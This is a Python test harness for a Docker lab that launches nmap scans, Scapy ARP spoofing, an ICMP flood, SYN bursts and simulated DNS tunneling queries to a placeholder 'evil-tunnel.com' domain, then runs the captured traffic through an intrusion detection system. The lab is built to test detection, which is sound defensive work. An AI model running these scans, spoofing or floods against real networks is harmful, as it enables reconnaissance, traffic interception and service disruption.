#!/usr/bin/env python3
"""
COMPREHENSIVE DOCKER ATTACK SUITE WITH ANOMALY DETECTION
- Signature-based attacks: Port scans, SYN floods, ARP spoofing
- Anomaly-based attacks: High entropy, traffic volume spikes, timing attacks
- Uses Scapy inside attacker container for sophisticated attacks
"""

import os
import sys
import time
import subprocess
from enhanced_ids import EnhancedIDS
from scapy.all import *

def check_docker_containers():
    """Verify Docker containers are running."""
    print("\n" + "=" * 70)
    print("🐳 CHECKING DOCKER ENVIRONMENT")
    print("=" * 70)
    
    required_containers = ['ids', 'attacker', 'victim']
    result = subprocess.run(['docker', 'ps', '--format', '{{.Names}}'], 
                          capture_output=True, text=True)
    running = result.stdout.strip().split('\n')
    
    missing = [c for c in required_containers if not any(c in r for r in running)]
    
    if missing:
        print(f"❌ Missing containers: {', '.join(missing)}")
        print("\n💡 Start containers with:")
        print("   docker-compose up -d")
        return False
    
    print("✅ All required containers running:")
    for container in required_containers:
        print(f"   • {container}")
    return True


def start_packet_capture():
    """Start tcpdump in victim container to capture incoming traffic."""
    print("\n" + "=" * 70)
    print("📡 STARTING PACKET CAPTURE IN VICTIM CONTAINER")
    print("=" * 70)
    
    # Start tcpdump in background on victim
    cmd = [
        'docker', 'exec', '-d', 'victim',
        'tcpdump', '-i', 'eth0', '-w', '/tmp/capture.pcap',
        'src', '10.0.0.20'  # Only capture traffic from attacker
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"❌ Failed to start tcpdump: {result.stderr}")
        return False
    
    print("✅ tcpdump started in victim container")
    print("   Capturing: src 10.0.0.20 (attacker traffic)")
    time.sleep(1)  # Let tcpdump initialize
    return True


def execute_signature_based_attacks():
    """Execute traditional signature-based attacks."""
    print("\n" + "=" * 70)
    print("🔥 PHASE 1: SIGNATURE-BASED ATTACKS")
    print("=" * 70)
    
    # Attack 1: nmap Port Scan (INCREASED to 200 ports)
    print("\n[1/5] Port Scan (nmap)")
    cmd = ['docker', 'exec', 'attacker', 'nmap', '-p', '1-200', '--max-rate', '50', '10.0.0.30']
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    if result.returncode == 0:
        print("   ✅ Port scan completed (200 ports)")
    else:
        print(f"   ⚠️  Port scan executed with warnings")
    
    time.sleep(1)
    
    # Attack 2: Aggressive SYN Scan
    print("\n[2/5] Aggressive SYN Scan (nmap)")
    cmd = ['docker', 'exec', 'attacker', 'nmap', '-sS', '-p', '80,443,8080,3306,5432', 
           '--max-rate', '100', '10.0.0.30']
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    if result.returncode == 0:
        print("   ✅ SYN scan completed (rapid fire)")
    else:
        print(f"   ⚠️  SYN scan executed")
    
    time.sleep(1)
    
    # Attack 3: ARP Spoofing with MAC changes
    print("\n[3/5] ARP Spoofing Attack")
    
    # Create ARP spoof script with changing MAC addresses
    arp_spoof_script = """
from scapy.all import *
import random
import time

victim = "10.0.0.30"
gateway = "10.0.0.1"

# Send ARP packets with fake MAC addresses to trigger ARP_SPOOF
for i in range(8):
    fake_mac = "aa:bb:cc:dd:ee:%02x" % random.randint(0, 255)
    arp = ARP(op=2, psrc=victim, hwsrc=fake_mac, pdst=gateway)
    send(arp, verbose=False)
    time.sleep(0.2)

print("ARP spoofing completed")
"""
    
    with open('/tmp/arp_spoof.py', 'w') as f:
        f.write(arp_spoof_script)
    
    subprocess.run(['docker', 'cp', '/tmp/arp_spoof.py', 'attacker:/tmp/arp_spoof.py'], 
                   capture_output=True)
    result = subprocess.run(['docker', 'exec', 'attacker', 'python3', '/tmp/arp_spoof.py'],
                           capture_output=True, text=True, timeout=10)
    print("   ✅ ARP spoofing completed (MAC changes)")
    time.sleep(1)
    
    # Attack 4: ICMP Flood (INCREASED to 180 packets)
    print("\n[4/5] ICMP Flood Attack")
    icmp_script = """
from scapy.all import *

victim = "10.0.0.30"
for i in range(180):
    pkt = IP(dst=victim)/ICMP(type=8, seq=i)
    send(pkt, verbose=False)

print("ICMP flood completed")
"""
    
    with open('/tmp/icmp_flood.py', 'w') as f:
        f.write(icmp_script)
    
    subprocess.run(['docker', 'cp', '/tmp/icmp_flood.py', 'attacker:/tmp/icmp_flood.py'],
                   capture_output=True)
    result = subprocess.run(['docker', 'exec', 'attacker', 'python3', '/tmp/icmp_flood.py'],
                           capture_output=True, text=True, timeout=15)
    print("   ✅ ICMP flood completed (180 packets)")
    time.sleep(1)
    
    # Attack 5: DNS Tunneling Simulation (INCREASED to 25 queries)
    print("\n[5/5] DNS Tunneling Attack")
    dns_script = """
from scapy.all import *
import random
import string

victim = "10.0.0.30"

# Generate suspicious long DNS queries (tunneling pattern)
for i in range(25):
    subdomain = ''.join(random.choices(string.hexdigits.lower(), k=32))
    query = f"{subdomain}.evil-tunnel.com"
    pkt = IP(dst=victim)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query))
    send(pkt, verbose=False)

print("DNS tunneling completed")
"""
    
    with open('/tmp/dns_tunnel.py', 'w') as f:
        f.write(dns_script)
    
    subprocess.run(['docker', 'cp', '/tmp/dns_tunnel.py', 'attacker:/tmp/dns_tunnel.py'],
                   capture_output=True)
    result = subprocess.run(['docker', 'exec', 'attacker', 'python3', '/tmp/dns_tunnel.py'],
                           capture_output=True, text=True, timeout=10)
    print("   ✅ DNS tunneling completed (25 suspicious queries)")
    time.sleep(1)


def execute_anomaly_based_attacks():
    """Execute sophisticated anomaly-based attacks using Scapy."""
    print("\n" + "=" * 70)
    print("🧪 PHASE 2: ANOMALY-BASED ATTACKS (HIGH ENTROPY)")
    print("=" * 70)
    
    # Create Python script for anomaly attacks
    scapy_script = r'''
from scapy.all import *
import random
import time

attacker = "10.0.0.20"
victim = "10.0.0.30"

print("\n[1/3] High Port Entropy Attack (Random Ports)")
ports = list(range(1, 65535))
random_ports = random.sample(ports, 150)
for port in random_ports:
    pkt = IP(src=attacker, dst=victim)/TCP(dport=port, flags="S")
    send(pkt, verbose=0)
print(f"   ✅ Sent SYN packets to 150 random ports (high entropy)")

time.sleep(1)

print("\n[2/3] Distributed Port Scan (Low & High Ports)")
low_ports = list(range(1, 50))
high_ports = list(range(10000, 10100))
all_ports = low_ports + high_ports
for port in random.sample(all_ports, 50):
    pkt = IP(src=attacker, dst=victim)/TCP(dport=port, flags="S")
    send(pkt, verbose=0)
print(f"   ✅ Sent packets to 50 distributed ports")

time.sleep(1)

print("\n[3/3] Traffic Volume Spike (Moderate Burst)")
# Use random high ports to preserve entropy diversity
burst_packets = []
for i in range(50):
    port = random.randint(10001, 65000)
    pkt = IP(src=attacker, dst=victim)/TCP(dport=port, flags="S", seq=i)
    send(pkt, verbose=0)
print(f"   ✅ Sent 50 packets in rapid burst to random ports")

print("\n✅ Anomaly attacks completed")
'''
    
    # Write script to temp file in attacker container
    print("\n⚙️  Preparing Scapy attack scripts in attacker container...")
    
    # Create script file in /tmp (works on both macOS and Linux)
    temp_path = '/tmp/anomaly_attacks_host.py'
    with open(temp_path, 'w') as f:
        f.write(scapy_script)
    
    subprocess.run(['docker', 'cp', temp_path, 'attacker:/tmp/anomaly_attacks.py'], 
                   capture_output=True)
    
    # Clean up host temp file
    try:
        os.unlink(temp_path)
    except:
        pass
    
    # Execute Scapy script
    print("🚀 Executing anomaly-based attacks...")
    cmd = ['docker', 'exec', 'attacker', 'python3', '/tmp/anomaly_attacks.py']
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    
    # Print output
    if result.stdout:
        print(result.stdout)
    
    if result.returncode == 0:
        print("✅ Anomaly attacks executed successfully")
    else:
        print(f"⚠️  Anomaly attacks completed with warnings")
        if result.stderr:
            print(f"   {result.stderr[:200]}")
    
    time.sleep(2)


def execute_timing_anomaly_attack():
    """Execute timing-based anomaly attack."""
    print("\n" + "=" * 70)
    print("⏱️  PHASE 3: TIMING ANOMALY ATTACK")
    print("=" * 70)
    
    scapy_script = '''
from scapy.all import *
import time

attacker = "10.0.0.20"
victim = "10.0.0.30"

print("\\n[1/1] Irregular Timing Pattern Attack")
# Burst-pause-burst pattern (anomalous), random ports to preserve entropy
for burst in range(3):
    print(f"   Burst {burst+1}/3...")
    for i in range(30):
        port = random.randint(10001, 65000)
        pkt = IP(src=attacker, dst=victim)/TCP(dport=port, flags="S")
        send(pkt, verbose=0)
    time.sleep(5)  # Unusual pause

print("\\n✅ Timing anomaly attack completed")
'''
    
    print("⚙️  Preparing timing attack script...")
    
    # Write script file to host then copy to container
    temp_path = '/tmp/timing_attack_host.py'
    with open(temp_path, 'w') as f:
        f.write(scapy_script)
    
    subprocess.run(['docker', 'cp', temp_path, 'attacker:/tmp/timing_attack.py'], 
                   capture_output=True)
    
    # Clean up host temp file
    try:
        os.unlink(temp_path)
    except:
        pass
    
    print("🚀 Executing timing anomaly attack...")
    cmd = ['docker', 'exec', 'attacker', 'python3', '/tmp/timing_attack.py']
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    
    if result.stdout:
        print(result.stdout)
    
    if result.returncode == 0:
        print("✅ Timing attack executed successfully")
    else:
        print(f"⚠️  Timing attack completed")
    
    time.sleep(2)


def stop_packet_capture():
    """Stop tcpdump in victim container."""
    print("\n" + "=" * 70)
    print("🛑 STOPPING PACKET CAPTURE")
    print("=" * 70)
    
    # Kill tcpdump process
    subprocess.run(['docker', 'exec', 'victim', 'pkill', 'tcpdump'],
                  capture_output=True)
    time.sleep(1)  # Let tcpdump finish writing
    print("✅ tcpdump stopped")


def copy_pcap_from_container():
    """Copy captured PCAP from victim container to host."""
    print("\n" + "=" * 70)
    print("📥 COPYING CAPTURED PCAP FROM CONTAINER")
    print("=" * 70)
    
    pcap_path = '../pcaps/docker_comprehensive_capture.pcap'
    cmd = ['docker', 'cp', 'victim:/tmp/capture.pcap', pcap_path]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"❌ Failed to copy PCAP: {result.stderr}")
        return None
    
    if not os.path.exists(pcap_path):
        print("❌ PCAP file not found after copy")
        return None
    
    file_size = os.path.getsize(pcap_path)
    print(f"✅ PCAP copied successfully")
    print(f"   Location: {pcap_path}")
    print(f"   Size: {file_size:,} bytes")
    
    return pcap_path


def analyze_with_ids(pcap_path):
    """Analyze captured PCAP with IDS."""
    print("\n" + "=" * 70)
    print("🔍 ANALYZING CAPTURED TRAFFIC WITH IDS")
    print("=" * 70)
    
    # Initialize IDS with anomaly detection enabled
    ids = EnhancedIDS(use_anomaly_detection=True)
    
    # Read PCAP
    try:
        packets = rdpcap(pcap_path)
        print(f"✅ Loaded {len(packets)} packets from PCAP")
    except Exception as e:
        print(f"❌ Failed to read PCAP: {e}")
        return
    
    # Process each packet
    print("\n📊 Processing packets through IDS...")
    for pkt in packets:
        try:
            ids.packet_handler(pkt)
        except Exception as e:
            pass  # Skip malformed packets
    
    # Print results
    print("\n" + "=" * 70)
    print("📊 DETECTION RESULTS")
    print("=" * 70)
    
    if os.path.exists('outputs/logs/alerts.log'):
        with open('outputs/logs/alerts.log', 'r') as f:
            alerts = f.readlines()
            
            # Categorize alerts
            signature_alerts = []
            anomaly_alerts = []
            
            for alert in alerts:
                if any(sig in alert for sig in ['PORT_SCAN', 'SYN_FLOOD', 'ARP_SPOOF']):
                    signature_alerts.append(alert)
                elif any(anom in alert for anom in ['ENTROPY', 'VOLUME', 'TIMING']):
                    anomaly_alerts.append(alert)
            
            total = len(alerts)
            sig_count = len(signature_alerts)
            anom_count = len(anomaly_alerts)
            
            print(f"\n🚨 TOTAL ALERTS: {total}")
            print(f"   📌 Signature-based: {sig_count}")
            print(f"   🧪 Anomaly-based: {anom_count}")
            
            if sig_count > 0:
                print(f"\n📌 Signature Alerts (showing last 10):")
                for alert in signature_alerts[-10:]:
                    print(f"   {alert.strip()}")
            
            if anom_count > 0:
                print(f"\n🧪 Anomaly Alerts (showing last 10):")
                for alert in anomaly_alerts[-10:]:
                    print(f"   {alert.strip()}")
            
            if total == 0:
                print("✅ No alerts detected (clean traffic)")
    else:
        print("⚠️  No alerts.log found")


def main():
    """Main workflow for comprehensive Docker attack testing."""
    print("\n" + "=" * 80)
    print("🐳 COMPREHENSIVE DOCKER ATTACK SUITE")
    print("=" * 80)
    print("\nThis suite executes:")
    print("  PHASE 1: Signature-based attacks")
    print("    • nmap port scan (100 ports)")
    print("    • Aggressive SYN scan")
    print("    • ARP reconnaissance")
    print("  PHASE 2: Anomaly-based attacks")
    print("    • High port entropy attack")
    print("    • Distributed port scan")
    print("    • Traffic volume spike")
    print("  PHASE 3: Timing anomaly")
    print("    • Burst-pause-burst pattern")
    print("\n" + "=" * 80)
    
    # Check Docker environment
    if not check_docker_containers():
        print("\n❌ Docker environment not ready")
        print("Run: docker-compose up -d")
        return 1
    
    # Start capture
    if not start_packet_capture():
        return 1
    
    # Execute attack phases
    time.sleep(1)
    execute_signature_based_attacks()
    execute_anomaly_based_attacks()
    execute_timing_anomaly_attack()
    time.sleep(2)
    
    # Stop capture and copy PCAP
    stop_packet_capture()
    pcap_path = copy_pcap_from_container()
    
    if not pcap_path:
        print("\n❌ Failed to capture traffic")
        return 1
    
    # Analyze with IDS
    analyze_with_ids(pcap_path)
    
    print("\n" + "=" * 80)
    print("✅ COMPREHENSIVE ATTACK SUITE COMPLETE")
    print("=" * 80)
    print(f"\nCaptured PCAP: {pcap_path}")
    print("View alerts: cat outputs/logs/alerts.log")
    print("\nNext step: Run full workflow to generate report:")
    print("  python3 workflow_docker_comprehensive.py")
    print("\n")
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
